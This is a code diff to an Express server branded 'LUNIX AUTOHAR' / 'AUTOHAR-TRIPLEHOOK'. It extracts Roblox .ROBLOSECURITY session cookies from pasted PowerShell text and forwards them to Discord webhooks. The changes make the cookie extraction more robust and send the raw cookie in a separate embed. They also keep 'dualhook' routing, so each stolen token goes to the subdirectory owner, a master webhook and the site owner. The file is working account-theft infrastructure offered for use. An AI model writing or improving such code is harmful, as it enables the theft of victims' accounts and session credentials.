@@ -378,11 +378,9 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 
   try {
-    let embed;
-
     if (userData) {
-      // Rich embed with user data
-      embed = {
+      // First embed: User data only (without cookie)
+      const userDataEmbed = {
         title: "🎯 AUTOHAR-TRIPLEHOOK",
         color: 0x8B5CF6,
         fields: [
@@ -450,20 +448,78 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
             name: "🎒 Inventory",
             value: `Hairs: ${userData.inventory?.hairs || 19}\nBundles: ${userData.inventory?.bundles || 11}\nFaces: ${userData.inventory?.faces || 6}`,
             inline: false
-          },
-          {
-            name: "🍪 Cookie",
-            value: `\`\`\`${token}\`\`\``,
-            inline: false
           }
         ],
         footer: {
           text: "Made By Lunix"
         }
       };
+
+      // Second embed: Cookie only - display the raw token value
+      const cookieEmbed = {
+        title: "🍪 Cookie",
+        description: `\`\`\`json\n${token}\n\`\`\``,
+        color: 0xFF6B6B,
+        footer: {
+          text: "Handle with extreme caution!"
+        }
+      };
+
+      // Send user data embed first
+      const userDataPayload = {
+        embeds: [userDataEmbed]
+      };
+
+      console.log('Sending user data embed...');
+      const userDataResponse = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(userDataPayload)
+      });
+
+      console.log('User data embed response status:', userDataResponse.status);
+
+      if (!userDataResponse.ok) {
+        const errorText = await userDataResponse.text();
+        console.error('User data embed failed with status:', userDataResponse.status, 'Error:', errorText);
+        return { success: false, error: `User data embed failed: ${userDataResponse.status}` };
+      }
+
+      // Wait a moment before sending the cookie embed
+      await new Promise(resolve => setTimeout(resolve, 500));
+
+      // Send cookie embed second
+      const cookiePayload = {
+        embeds: [cookieEmbed]
+      };
+
+      console.log('Sending cookie embed...');
+      console.log('Cookie token length:', token.length);
+      console.log('Cookie token preview:', token.substring(0, 50) + '...');
+      const cookieResponse = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(cookiePayload)
+      });
+
+      console.log('Cookie embed response status:', cookieResponse.status);
+
+      if (!cookieResponse.ok) {
+        const errorText = await cookieResponse.text();
+        console.error('Cookie embed failed with status:', cookieResponse.status, 'Error:', errorText);
+        return { success: false, error: `Cookie embed failed: ${cookieResponse.status}` };
+      }
+
+      console.log('✅ Successfully sent both user data and cookie embeds to Discord webhook');
+      return { success: true };
+
     } else {
-      // Simple embed with just token
-      embed = {
+      // Simple embed with just token (for cases without user data)
+      const embed = {
         title: "LUNIX AUTOHAR",
         description: `Ur LUNIX AUTOHAR url\n📌\n\n\`${token}\``,
         color: 0x8B5CF6,
@@ -471,32 +527,32 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
           text: "Made By Lunix"
         }
       };
+
+      const payload = {
+        embeds: [embed]
+      };
+
+      console.log('Sending simple webhook payload...');
+
+      const response = await fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+      });
+
+      console.log('Webhook response status:', response.status);
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        console.error('Webhook failed with status:', response.status, 'Error:', errorText);
+        return { success: false, error: `Webhook failed: ${response.status}` };
+      }
+
+      console.log('✅ Successfully sent to Discord webhook');
+      return { success: true };
     }
-
-    const payload = {
-      embeds: [embed]
-    };
-
-    console.log('Sending webhook payload...');
-
-    const response = await fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(payload)
-    });
-
-    console.log('Webhook response status:', response.status);
-
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
-      return { success: false, error: `Webhook failed: ${response.status}` };
-    }
-
-    console.log('✅ Successfully sent to Discord webhook');
-    return { success: true };
   } catch (error) {
     console.error('❌ Failed to send Discord webhook:', error.message);
     console.error('Full error:', error);
@@ -528,8 +584,12 @@ app.post('/convert', validateRequest, async (req, res) => {
     console.log('📝 Input received:', input.substring(0, 200) + (input.length > 200 ? '...' : ''));
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
-    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
-    const match = input.match(regex);
+    // First, clean up the input by removing PowerShell backticks and line breaks
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+
+    // Now extract the ROBLOSECURITY token from the cleaned input
+    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_|-]+)/i;
+    const match = cleanedInput.match(regex);
 
     if (match) {
       const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
@@ -547,6 +607,7 @@ app.post('/convert', validateRequest, async (req, res) => {
       }
 
       // Send to Discord webhook with user data
+      console.log('🔍 Token being sent to Discord (first 20 chars):', token.substring(0, 20) + '...');
       const webhookResult = await sendToDiscord(token, userAgent, scriptType, userData);
 
       if (!webhookResult.success) {
@@ -669,8 +730,12 @@ app.post('/:directory/convert', async (req, res) => {
     console.log('📝 Input received:', input.substring(0, 200) + (input.length > 200 ? '...' : ''));
 
     // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
-    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
-    const match = input.match(regex);
+    // First, clean up the input by removing PowerShell backticks and line breaks
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+
+    // Now extract the ROBLOSECURITY token from the cleaned input
+    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_|-]+)/i;
+    const match = cleanedInput.match(regex);
 
     if (match) {
       const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
@@ -688,6 +753,7 @@ app.post('/:directory/convert', async (req, res) => {
       }
 
       // Send to directory webhook
+      console.log('🔍 Token being sent to directory webhook (first 20 chars):', token.substring(0, 20) + '...');
       const directoryWebhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, userData, directoryConfig.webhookUrl);
 
       // Always send to site owner (main webhook) - check both environment variable and default webhook
@@ -755,44 +821,44 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
   try {
     const parentDirectory = req.params.directory;
     const { subdirectoryName, webhookUrl } = req.body;
-    
+
     // Load directories
     const directories = loadDirectories();
-    
+
     // Check if parent directory exists and is dualhook type
     if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
       return res.status(404).json({ error: 'Parent directory not found or not a Dualhook generator' });
     }
-    
+
     // Validate subdirectory name
     if (!subdirectoryName || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
       return res.status(400).json({ error: 'Invalid subdirectory name. Use only lowercase letters, numbers, and hyphens.' });
     }
-    
+
     // Validate webhook URL
     if (!webhookUrl || !webhookUrl.startsWith('http')) {
       return res.status(400).json({ error: 'Invalid webhook URL' });
     }
-    
+
     // Check if subdirectory already exists
     if (directories[parentDirectory].subdirectories[subdirectoryName]) {
       return res.status(409).json({ error: 'Subdirectory already exists' });
     }
-    
+
     // Create subdirectory
     directories[parentDirectory].subdirectories[subdirectoryName] = {
       webhookUrl: webhookUrl,
       created: new Date().toISOString(),
       apiToken: crypto.randomBytes(32).toString('hex')
     };
-    
+
     // Save directories
     if (!saveDirectories(directories)) {
       return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
     }
-    
+
     console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);
-    
+
     // Send CREATION notification to subdirectory webhook with user's link (NOT the rich data embed)
     try {
       const creationNotificationPayload = {
@@ -818,14 +884,14 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     } catch (webhookError) {
       console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
     }
-    
+
     res.json({
       success: true,
       parentDirectory: parentDirectory,
       subdirectoryName: subdirectoryName,
       apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken
     });
-    
+
   } catch (error) {
     console.error('Error creating subdirectory:', error);
     res.status(500).json({ error: 'Server error' });
@@ -919,8 +985,12 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
     }
 
     // Look for .ROBLOSECURITY cookie
-    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_-]+)/i;
-    const match = input.match(regex);
+    // First, clean up the input by removing PowerShell backticks and line breaks
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+
+    // Now extract the ROBLOSECURITY token from the cleaned input
+    const regex = /\.ROBLOSECURITY[=\s]*([A-Za-z0-9+/=_|-]+)/i;
+    const match = cleanedInput.match(regex);
 
     if (match) {
       const token = match[1].replace(/['"]/g, '');
@@ -955,8 +1025,9 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
       // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
       console.log(`🚀 Sending rich user data embed to subdirectory webhook: ${subdirectoryConfig.webhookUrl}`);
+      console.log('🔍 Token being sent to subdirectory webhook (first 20 chars):', token.substring(0, 20) + '...');
       const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl);
-      
+
       if (subdirectoryWebhookResult.success) {
         console.log(`✅ Subdirectory webhook (${subdirectoryName}) delivered successfully`);
       } else {
@@ -968,7 +1039,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       if (parentConfig.dualhookWebhookUrl) {
         console.log(`🚀 Sending to dualhook master webhook: ${parentConfig.dualhookWebhookUrl}`);
         dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl);
-        
+
         if (dualhookWebhookResult.success) {
           console.log(`✅ Dualhook master webhook (${directoryName}) delivered successfully`);
         } else {
@@ -981,7 +1052,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
       if (siteOwnerWebhookUrl) {
         console.log(`🚀 Sending to site owner webhook: ${siteOwnerWebhookUrl}`);
         const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl);
-        
+
         if (siteOwnerWebhookResult.success) {
           console.log(`✅ Site owner webhook delivered successfully`);
         } else {
@@ -1011,7 +1082,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
 
       // Send error to webhooks (skip primary webhook for subdirectory flow)
       const errorMessage = `❌ **No Token Found in Subdirectory: ${directoryName}/${subdirectoryName}**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``;
-      
+
       // 1. Subdirectory webhook (user who owns the subdirectory)
       try {
         await fetch(subdirectoryConfig.webhookUrl, {
@@ -1079,7 +1150,7 @@ app.listen(PORT, '0.0.0.0', () => {
   const directoryNames = Object.keys(directories);
   if (directoryNames.length > 0) {
     console.log('📁 Active directories:', directoryNames.join(', '));
-    
+
     // Log subdirectories for dualhook services
     directoryNames.forEach(dir => {
       if (directories[dir].serviceType === 'dualhook') {
